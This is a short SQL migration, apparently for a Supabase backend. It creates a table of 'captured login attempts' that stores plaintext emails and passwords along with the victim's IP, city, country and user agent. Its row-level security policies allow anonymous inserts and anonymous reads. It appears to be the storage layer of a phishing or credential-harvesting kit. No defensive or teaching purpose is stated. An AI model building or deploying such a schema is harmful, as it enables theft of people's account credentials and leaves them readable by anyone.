-- Create credentials table to store captured login attempts
CREATE TABLE public.credentials (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  email TEXT,
  password TEXT,
  ip TEXT,
  country TEXT,
  city TEXT,
  user_agent TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.credentials ENABLE ROW LEVEL SECURITY;

-- Allow anonymous inserts
CREATE POLICY "Allow anonymous inserts on credentials"
  ON public.credentials
  FOR INSERT
  TO anon, authenticated
  WITH CHECK (true);

-- Allow select (for admin access)
CREATE POLICY "Allow select on credentials"
  ON public.credentials
  FOR SELECT
  TO anon, authenticated
  USING (true);
